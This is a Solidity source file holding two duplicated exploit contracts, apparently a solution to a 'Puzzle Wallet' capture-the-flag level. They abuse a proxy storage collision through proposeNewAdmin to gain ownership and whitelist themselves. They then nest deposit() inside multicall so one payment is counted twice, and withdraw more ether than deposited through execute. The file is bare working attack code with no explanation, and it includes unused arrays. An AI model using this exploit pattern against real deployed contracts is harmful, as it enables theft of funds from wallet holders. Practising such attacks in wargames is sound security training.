// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

interface IPuzzleWallet {
    function proposeNewAdmin(address _expectedAdmin) external;
    function addToWhitelist(address addr) external;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract PuzzleWalletExploit {
    bytes[] data_ = [abi.encodeWithSignature("deposit()")];
    bytes[] data = [abi.encodeWithSignature("deposit()"), abi.encodeWithSignature("multicall(bytes[])", data_)];

    function exploit(address instanceAddress) public payable {
        IPuzzleWallet instance = IPuzzleWallet(instanceAddress);
        instance.proposeNewAdmin(address(this));
        instance.addToWhitelist(address(this));

        bytes[] memory nestedCalls = new bytes[](1);
        nestedCalls[0] = abi.encodeWithSignature("deposit()");

        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSignature("deposit()");
        calls[1] = abi.encodeWithSignature("multicall(bytes[])", nestedCalls);

        instance.multicall{value: 0.001 ether}(calls);
        instance.execute(address(this), 0.002 ether, "");
    }

    receive() external payable {}
}

contract PuzzleWalletAttacker {
    constructor() {}

    function attack(address instanceAddress) public payable {
        IPuzzleWallet instance = IPuzzleWallet(instanceAddress);
        instance.proposeNewAdmin(address(this));
        instance.addToWhitelist(address(this));

        bytes[] memory nestedCalls = new bytes[](1);
        nestedCalls[0] = abi.encodeWithSignature("deposit()");

        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSignature("deposit()");
        calls[1] = abi.encodeWithSignature("multicall(bytes[])", nestedCalls);

        instance.multicall{value: 0.001 ether}(calls);
        instance.execute(address(this), 0.002 ether, "");
    }

    receive() external payable {}
}
